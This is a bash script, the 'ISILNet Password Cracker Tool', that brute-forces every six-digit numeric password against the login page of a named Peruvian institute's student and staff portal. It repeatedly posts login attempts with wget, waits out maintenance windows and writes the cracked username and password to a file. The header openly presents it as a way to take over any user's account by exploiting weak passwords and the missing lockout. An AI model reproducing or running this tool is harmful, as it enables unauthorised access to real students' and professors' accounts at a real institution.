#!/bin/bash

##
# ISILNet Password Cracker Tool v1.0
#
# Author: Oscar Jara [oscar_e24@hotmail.com]
#
# READ THIS BEFORE DOING ANYTHING
#
# The author does not take any responsibility of what you could do with this tool, 
# use it at your own risk.
#
# FAQ
#
# What is ISILNet?
# --
# A private web system from ISIL (Instituto San Ignacio de Loyola) peruvian institute 
# which is used by students and professors.
# 
# What's the script purpose?
# --
# To take advantage of security breaches in order to brute force a password from any user.
# This usually happens when using weak passwords like current system does, there are no login 
# validation attemps and security is not the best at server side.
#
# How it works?
# --
# Script will generate passwords and login attempts and won't stop until getting a success one. 
# In order to know what's going on, server responses will be evaluated to know if login was success, 
# failed or remote website is under maintenance. If this last one happens, process will wait for it 
# until it gets available again before re-trying an attempt, this means you just need to run the script 
# and leave it doing its job. Remember that breaking a password could take time and there are a total of 
# 1000000 (one million) password combinations to test (which is not much, really). I'll suggest to run the 
# script during a whole weekend, for example. Your internet connection also counts to make this process faster, 
# please be patient.
#
# What do I need to make it work?
# --
# Unix terminal or Cygwin with bash and wget installed.
# File might be in UNIX format and ANSI encoded.
#
# How to make it work?
# --
# In order to start cracking a password...
# Modify USER variable from configuration section (see below) including username from the victim.
# Modify other variables only if you know what you are doing otherwise leave them by default.
# Go to your terminal and run the following command: sh /path/to/script.sh
#
# Enjoy.
##

##
# Modify shell property to match case insensitive patterns when looking for certain strings.
# This command is available since bash v2 only.
##
shopt -s nocasematch

##
# Configuration section
##
APP_NAME="ISILNet Password Cracker Tool"
APP_VERSION="1.0"
APP_AUTHOR="Oscar Jara"
APP_AUTHOR_EMAIL="oscar_e24@hotmail.com"

##
# Configuration section
# --
# > URL = Where the login requests are processed in remote website.
# > USER = Username that you wish to have its password (e.g. i012345).
##
URL="https://isilnet.isil.pe/login.asp"
USER="i012345"

##
# Configuration section
# --
# After analyzing remote website behavior in each context (success, fail or maintenance) 
# below variables will store the strings that can be always found in each server response.
# > SUCCESS_STR = This string will determine if a login was success.
# > FAILED_STR = This string will determine if a login was failed.
# > MAINTENANCE_STR = This string will determine if the remote website is under maintenance.
##
SUCCESS_STR="bienvenido a isilnet"
FAILED_STR="olvidaste tu clave"
MAINTENANCE_STR="estamos actualizando"

##
# Configuration section
# --
# > LOGIN_CMD = Command to perform a login attempt in remote website.
##
LOGIN_CMD="wget -qO- ${URL} --post-data form_user=${USER}&form_pwd="

## 
# Login attempts counter
##
c=0

##
# Find if server response contains a string (using wildcards) that matches any of predefined strings in 
# configuration constants (SUCCESS_STR, FAILED_STR and MAINTENANCE_STR). This function will determine if 
# the remote website is under maintenance or a success/failed login was done.
##
is_logged() {
	local o="$1"
	if [[ "$o" == *${SUCCESS_STR}* ]]; then
		return 0
	elif [[ "$o" == *${FAILED_STR}* ]]; then
		return 1
	elif [[ "$o" == *${MAINTENANCE_STR}* ]]; then
		echo -e "\n#~~~~~~~~~~~~~~#\n\nSe ha detectado que el sistema se encuentra en mantenimiento.\n\n#~~~~~~~~~~~~~~#\n"
		while [[ "$o" == *${MAINTENANCE_STR}* ]]; do
			echo "Esperando a que el sistema se restablezca antes de continuar..."
			# Check system status again
			o=$(${LOGIN_CMD}"$2")
		done
		echo -e "\n#~~~~~~~~~~~~~~#\n\nSe ha restablecido el sistema, el proceso continuara.\n\n#~~~~~~~~~~~~~~#\n"
		echo "Se procedera nuevamente a utilizar la clave: $2 en el intento #$c"
		# Do recursivity
		is_logged "$o" "$2"
	else
		# If we are at this point, possible reasons could be any of these:
		# > String doesn't match (odd behavior)
		# > Remote site not available (down or moved)
		# > Lost connection with host
		# > Network problem, check your internet connection
		echo -e "\n#~~~~~~~~~~~~~~#\n\nSe ha detectado una respuesta inesperada del sistema o existe un problema de conexion.\n\n#~~~~~~~~~~~~~~#\n"
		echo "Proceso terminado debido a un error."
		exit 1
	fi
}

##
# Generate passwords that will be used for brute forcing user account 
# until getting a success login in remote website.
# > Password pattern is: 6 dig. numeric [0-9] passwords
# > Possible combinations are: 1000000 (one million)
##
echo -e "#~~~~~~~~~~~~~~#\n\n${APP_NAME} v${APP_VERSION}\nBy ${APP_AUTHOR} [${APP_AUTHOR_EMAIL}]\n\n#~~~~~~~~~~~~~~#\n"
echo -e "Se analizara la clave del usuario: ${USER}\nLas peticiones se realizaran hacia: ${URL}\n\n#~~~~~~~~~~~~~~#\n"
echo -e "Generando todas las combinaciones de claves posibles...\n"
for p in {0..9}{0..9}{0..9}{0..9}{0..9}{0..9}; do 
	(( c++ ))
	echo "Se procedera a utilizar la clave $p en el intento #$c"
	# Perfom login attempt
	o=$(${LOGIN_CMD}"$p")	
	if is_logged "$o" "$p" -eq 0; then 
		echo -e "Intento [OK]\n\n#~~~~~~~~~~~~~~#\nHACKED!\n\nUsuario: ${USER}\nClave: $p\n\n#~~~~~~~~~~~~~~#\n"		
		# Save data in file, this will be located in the home folder 
		# from the user running the script and overrided when new data 
		# is found (be careful)
		f="data.txt"		
		echo -e "Se procedera a guardar los datos en el disco duro.\nGuardando..."
		echo "Usuario: ${USER}, Clave: $p" > "$f"
		echo -e "Datos guardados correctamente en el directorio 'home' como '$f'\n"
		break
	else 
		echo "Intento fallido."
	fi
done
echo "Proceso terminado."
exit 0